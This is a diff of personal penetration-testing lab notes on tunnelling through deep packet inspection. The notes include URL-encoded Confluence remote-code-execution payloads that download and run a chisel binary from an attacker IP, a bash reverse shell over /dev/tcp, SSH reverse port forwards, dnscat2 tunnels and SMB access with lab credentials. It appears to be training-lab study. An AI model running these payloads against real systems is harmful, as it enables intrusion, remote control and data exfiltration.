@@ -73,14 +73,10 @@ wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 # Put together into curl for exploiting Confluence RCE
 curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
 
-
-
-
 # Run Chisel client from web shell and report back error to the Attacker on port 8080
 /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/ 
 # Run Chisel client from web shell in background
 /tmp/chisel client 192.168.118.4:8080 R:socks &> /dev/null 2&1 &
-
 
 # Put together into curl for exploiting Confluence RCE
 curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
@@ -198,43 +194,12 @@ www.feline.corp text = "here's is data chunk to be sent to network!"
 www.feline.corp text = "here's another data junk"
 ```
 
----
-
-exercise
-
-192.168.195.64
-
-Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - MULTISERVER03 OS Credentials:
-
-No credentials were provided for this machine
-
-192.168.195.7
-
-Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - FELINEAUTHORITY OS Credentials:
-
-kali / 7he_C4t_c0ntro11er
-
-10.4.195.215
-
-Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - PGDATABASE01 OS Credentials:
-
-database_admin / sqlpass123
-
-172.16.195.217
-
-Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - HRSHARES OS Credentials:
-
-No credentials were provided for this machine
-
-192.168.195.63
-
-Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - CONFLUENCE01 OS Credentials:
-
-No credentials were provided for this machine
+## Hand-on Bypass Deep Packet Inspection
 
 Exploit
 
 ```bash
+# Exploit Confluence 
 curl http://192.168.163.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.164/4444%200%3E%261%27%29.start%28%29%22%29%7D/
 ```
 
@@ -243,7 +208,7 @@ Victim
 ```bash
 # SSH Remote Port Forward tunnel from KALI to PGDATABASE
 python3 -c 'import pty; pty.spawn("/bin/sh")'
-ssh -N -R 127.0.0.1:2222:10.4.163.215:22 bmoser@192.168.45.164 -v -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+ssh -N -R 127.0.0.1:2222:10.4.163.215:22 kali@ATTACKER -v -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
 
 ```
 
@@ -287,5 +252,5 @@ dnscat2> listen 0.0.0.0:4455 172.16.195.217:445
 Listening on 0.0.0.0:4455, sending connections to 172.16.195.217:445
 
 # Run SMB attack from Kali
-smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=SomePassword
 ```
